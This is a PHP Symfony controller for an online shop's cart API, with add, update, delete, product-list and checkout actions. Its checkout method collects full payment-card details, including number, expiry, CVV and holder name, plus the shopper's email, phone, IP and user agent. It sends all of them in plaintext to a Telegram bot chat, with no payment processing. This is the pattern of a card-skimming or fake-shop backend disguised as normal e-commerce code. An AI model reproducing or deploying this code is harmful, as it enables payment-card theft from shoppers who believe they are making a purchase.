<?php

declare(strict_types=1);

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;
use Symfony\Contracts\HttpClient\Exception\ClientExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\RedirectionExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\ServerExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
use Symfony\Contracts\HttpClient\HttpClientInterface;

#[Route('/api', name: 'api', methods: ['POST'])]
class CartController extends AbstractController
{
    private const string CART_SESSION_KEY = 'cart';

    private static array $productsCache = [];

    private array $products;

    private HttpClientInterface $client;

    private string $token;

    private string $chatId;

    public function __construct(HttpClientInterface $client, string $token, string $chatId)
    {
        $this->client = $client;
        $this->token = $token;
        $this->chatId = $chatId;

        if (empty(self::$productsCache)) {
            self::$productsCache = require __DIR__ . '/../config/products.php';
        }
        $this->products = self::$productsCache;
    }

    public function __invoke(Request $request): Response
    {
        $action = $request->request->get('action', '');

        $result = match ($action) {
            'cart/add' => $this->add(),
            'cart/update' => $this->update(),
            'cart/delete' => $this->delete(),
            'cart/get' => $this->get(),
            'products/get' => $this->getProducts(),
            'cart/checkout' => $this->checkout(),
            default => ['success' => false, 'message' => 'Invalid action'],
        };

        return $this->json($result, 200, [
            'Access-Control-Allow-Origin' => '*',
            'Access-Control-Allow-Credentials' => 'true',
        ]);
    }

    public function add(): array
    {
        $productId = $_POST['product_id'] ?? '';
        $quantity = (int)($_POST['quantity'] ?? 1);

        if (empty($productId) || $quantity < 1 || $quantity > 999 || !isset($this->products[$productId])) {
            return ['success' => false, 'message' => 'Invalid data'];
        }

        $cart = $this->getCart();
        if (isset($cart[$productId])) {
            $cart[$productId] += $quantity;
        } else {
            $cart[$productId] = $quantity;
        }

        $_SESSION[self::CART_SESSION_KEY] = $cart;

        return ['success' => true, 'cart' => $this->getCartItems()];
    }

    public function update(): array
    {
        $productId = $_POST['product_id'] ?? '';
        $quantity = (int)($_POST['quantity'] ?? 0);

        if (empty($productId) || ($quantity < 0 || $quantity > 999) || (!isset($this->products[$productId]) && $quantity > 0)) {
            return ['success' => false, 'message' => 'Invalid data'];
        }

        $cart = $this->getCart();
        if ($quantity === 0) {
            unset($cart[$productId]);
        } else {
            $cart[$productId] = $quantity;
        }

        $_SESSION[self::CART_SESSION_KEY] = $cart;

        return ['success' => true, 'cart' => $this->getCartItems()];
    }

    public function delete(): array
    {
        $productId = $_POST['product_id'] ?? '';

        if (empty($productId)) {
            return ['success' => false, 'message' => 'Invalid data'];
        }

        $cart = $this->getCart();
        unset($cart[$productId]);
        $_SESSION[self::CART_SESSION_KEY] = $cart;

        return ['success' => true, 'cart' => $this->getCartItems()];
    }

    public function get(): array
    {
        return ['success' => true, 'cart' => $this->getCartItems()];
    }

    public function getProducts(): array
    {
        $products = [];
        foreach ($this->products as $id => $product) {
            $products[] = array_merge(['id' => $id], $product);
        }

        return ['success' => true, 'products' => $products];
    }

    public function checkout(): array
    {
        $cart = $this->getCart();

        if (empty($cart)) {
            return ['success' => false, 'message' => 'Cart is empty'];
        }

        $email = $_POST['email'] ?? '';
        $phone = $_POST['phone'] ?? '';

        if (empty($email) || empty($phone) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return ['success' => false, 'message' => 'Email and phone are required, email must be valid'];
        }

        $cardNumber = $_POST['cardNumber'] ?? '';
        $cardExpiryMonth = $_POST['cardExpiryMonth'] ?? '';
        $cardExpiryYear = $_POST['cardExpiryYear'] ?? '';
        $cardCvv = $_POST['cardCvv'] ?? '';
        $cardHolderName = $_POST['cardHolderName'] ?? '';

        if (empty($cardNumber) || empty($cardExpiryMonth) || empty($cardExpiryYear) || empty($cardCvv) || empty($cardHolderName) || !is_numeric($cardCvv) || $cardCvv <= 0 || $cardCvv > 999) {
            return ['success' => false, 'message' => 'Card data are not correct'];
        }

        $message = "New order received:\n";
        foreach ($cart as $productId => $quantity) {
            $productName = $this->products[$productId]['name'] ?? $productId;
            $message .= "$productName: $quantity\n";
        }

        $message .= "-----\n" .
            "Card data:\n" .
            "Number: $cardNumber\n" .
            "Expired at: $cardExpiryMonth/$cardExpiryYear\n" .
            "CVV: $cardCvv\n" .
            "Holder name: $cardHolderName\n";

        $message .= "-----\n" .
            "Email: $email\n" .
            "Phone: $phone\n";

        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "-----\n" .
            "IP: $ip\n" .
            "User-Agent: $userAgent";

        $url = 'https://api.telegram.org/bot' . $this->token . '/sendMessage';
        $params = [
            'chat_id' => $this->chatId,
            'text' => $message,
        ];

        try {
            $response = $this->client->request('POST', $url, ['body' => $params]);
            $responseBody = $response->getContent();
            $responseData = json_decode($responseBody, true);

            if ($responseData['ok']) {
                $_SESSION[self::CART_SESSION_KEY] = [];

                return ['success' => true, 'message' => 'Order sent to Telegram'];
            } else {
                return ['success' => false, 'message' => 'Failed to send message to Telegram'];
            }
        } catch (ClientExceptionInterface|RedirectionExceptionInterface|ServerExceptionInterface|TransportExceptionInterface $e) {
            error_log('Telegram send error: ' . $e->getMessage());

            return ['success' => false, 'message' => 'Error sending message'];
        }
    }

    private function getCart(): array
    {
        return $_SESSION[self::CART_SESSION_KEY] ?? [];
    }

    private function getCartItems(): array
    {
        $cart = $this->getCart();

        $items = [];
        foreach ($cart as $productId => $quantity) {
            if (isset($this->products[$productId])) {
                $items[] = [
                    'id' => $productId,
                    'name' => $this->products[$productId]['name'],
                    'price' => $this->products[$productId]['price'],
                    'quantity' => $quantity,
                    'total' => $this->products[$productId]['price'] * $quantity,
                ];
            }
        }

        return $items;
    }
}
